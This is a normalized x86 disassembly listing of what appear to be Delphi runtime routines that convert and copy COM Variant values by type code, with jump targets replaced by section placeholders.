lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e924
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e924
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef50
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40ec58
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e924
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f40
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_4141e8
test al al
je r-xdata
mov ecx sub_40ef48
mov edx esi
mov eax ebx
call sub_40ed7c
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e924
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40effc
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ef50
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ec58
sub_40f040
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f09c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40effc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f2c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f0a3
lea eax [ ebp - 0x10 ]
call sub_40ecd4
retn
sub_40f0ac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f0ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412714
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4130c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f0f1
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
sub_40f0f8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f136
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_411fec
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413098
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f13d
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_40f144
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f182
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412db8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f189
lea eax [ ebp - 0x4 ]
call sub_405758
retn
sub_40f190
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f1ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412cec
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4130fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1d5
lea eax [ ebp - 0x4 ]
call sub_405758
retn
sub_40f1dc
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f2c8
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e930
jmp r-xdata
mov edx esi
call sub_40e49c
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40e930
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f25c
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_4141e8
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f040
jmp r-xdata
mov edx esp
mov eax esi
call sub_4141e8
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f1dc
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f2c8
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40effc
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f2c8
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f30d ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f0f8
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ea3c
jmp r-xdata
mov eax ebx
call sub_40fc34
mov edx eax
mov eax esi
call sub_412f40
jmp r-xdata
mov eax ebx
call sub_40f68c
mov edx eax
mov eax esi
call sub_412ea0
jmp r-xdata
mov eax ebx
call sub_410ff8
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_412f8c
jmp r-xdata
mov eax ebx
call sub_410c60
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_412fb0
jmp r-xdata
mov eax ebx
call sub_411938
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_412fdc
jmp r-xdata
mov eax ebx
call sub_4113d0
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413008
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f0ac
jmp r-xdata
mov eax ebx
call sub_41074c
mov edx eax
mov eax esi
call sub_413034
jmp r-xdata
mov eax ebx
call sub_40fadc
mov edx eax
mov eax esi
call sub_412f20
jmp r-xdata
mov eax ebx
call sub_40fb8c
mov edx eax
mov eax esi
call sub_412ec0
jmp r-xdata
mov eax ebx
call sub_40fd2c
mov edx eax
mov eax esi
call sub_412ee0
jmp r-xdata
mov eax ebx
call sub_40fe04
mov edx eax
mov eax esi
call sub_412f00
jmp r-xdata
mov eax ebx
call sub_410150
push edx
push eax
mov eax esi
call sub_412f60
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f144
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f190
jmp r-xdata
mov dx 0x101
call sub_40e49c
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40ecd4
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f25c
xor edx edx
mov ax 0x1
call sub_40e49c
jmp r-xdata
sub_40f4f4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f597
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412714
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408110
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f59e
lea eax [ ebp - 0xc ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_4045cc
retn
mov eax ebx
call sub_41074c
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40e930
jmp r-xdata
sub_40f5a8
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40e930
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f5e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f638
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40effc
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f68c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f63f
lea eax [ ebp - 0x14 ]
call sub_40ecd4
retn
sub_40f648
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f68c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40faad
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f6bf ]
mov eax [ ebp - 0x4 ]
call sub_40f4f4
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f4f4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f68c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f5a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f5e4
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e49c
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f648
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f5a8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f5a8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40f8e3 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402978
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f4f4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f68c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030ac
sub_40fadc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e49c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fb68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
sub_40fb8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e49c
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fc0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
sub_40fc34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40fd08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fc5a ]
jmp [ eax * 4 + jump_table_40fc6c ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e49c
sub_40fd2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40fde1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f68c
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fd4e ]
jmp [ eax * 4 + jump_table_40fd61 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e49c
sub_40fe04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_40fec9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410150
test edx edx
je r-xdata
mov al [ eax + lookup_table_40fe2a ]
jmp [ eax * 4 + jump_table_40fe3e ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030ac
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e49c
sub_40feec
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402978
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40e930
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_41074c
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_40ff98
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410086
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412714
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404174
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408130
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41008d
lea eax [ ebp - 0x1c ]
call sub_403eec
lea eax [ ebp - 0xc ]
call sub_4045cc
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402978
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40e930
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_41074c
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410098
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4100ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40effc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410150
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100f6
lea eax [ ebp - 0x18 ]
call sub_40ecd4
retn
sub_410104
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4141e8
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410150
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41055c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410183 ]
mov eax [ ebp - 0x4 ]
call sub_40ff98
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402978
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40ff98
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
